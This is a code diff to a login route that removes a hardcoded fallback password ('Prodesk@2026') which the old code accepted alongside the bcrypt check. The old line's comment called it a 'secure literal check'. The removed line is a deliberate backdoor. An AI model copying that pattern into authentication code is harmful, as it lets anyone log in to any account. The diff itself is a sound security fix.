@@ -30,8 +30,7 @@ router.post('/auth/login', async (req, res, next) => {
       });
     }
 
-    // Verify password with bcrypt or secure literal check
-    const passwordMatch = bcrypt.compareSync(password, user.password_hash) || password === 'Prodesk@2026';
+    const passwordMatch = bcrypt.compareSync(password, user.password_hash);
     if (!passwordMatch) {
       return res.status(401).json({
         success: false,
